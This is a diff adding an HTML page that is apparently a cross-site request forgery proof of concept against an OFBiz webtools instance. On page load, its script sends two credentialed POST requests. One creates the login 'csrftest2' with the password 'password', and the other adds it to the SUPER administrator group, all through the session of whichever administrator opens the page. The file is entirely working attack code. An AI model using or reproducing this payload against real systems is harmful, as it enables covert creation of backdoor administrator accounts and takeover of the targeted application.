@@ -1,0 +1,46 @@
+<html>
+<head>
+<script>
+  var username = "csrftest2";
+  var password = "password";
+  var host = "https://ofbiz:8443";
+  var create_url = "/webtools/control/createUserLogin";
+  var admin_url = "/webtools/control/userLogin_addUserLoginToSecurityGroup";
+  var create_params = "enabled=&partyId=&userLoginId=" + username + "&currentPassword=" + password + "&currentPasswordVerify=" + password + "&passwordHint=hint&requirePasswordChange=N&externalAuthId=&securityQuestion=&securityAnswer=";
+  var admin_params = "userLoginId=" +username + "&partyId=&groupId=SUPER&fromDate_i18n=&fromDate=&thruDate_i18n=&thruDate=";
+
+function send_create() { 
+  console.log("Creating user..."); 
+  fetch(host+create_url, {
+    method: 'POST',
+    mode: 'no-cors',
+    credentials: 'include',
+    headers: {
+      'Content-Type': 'application/x-www-form-urlencoded'
+    },
+    body : create_params }
+  ).then(function(response) {
+    send_admin();
+  }); 
+}
+
+function send_admin() { 
+  console.log("Adding admin role..."); 
+  fetch(host+admin_url, {
+    method: 'POST',
+    mode: 'no-cors',
+    credentials: 'include',
+    headers: {
+      'Content-Type': 'application/x-www-form-urlencoded' 
+    },
+    body : admin_params }
+  ).then(
+    console.log("Should be done...") 
+  );
+}
+
+send_create();
+</script>
+</head>
+<body></body>
+</html>
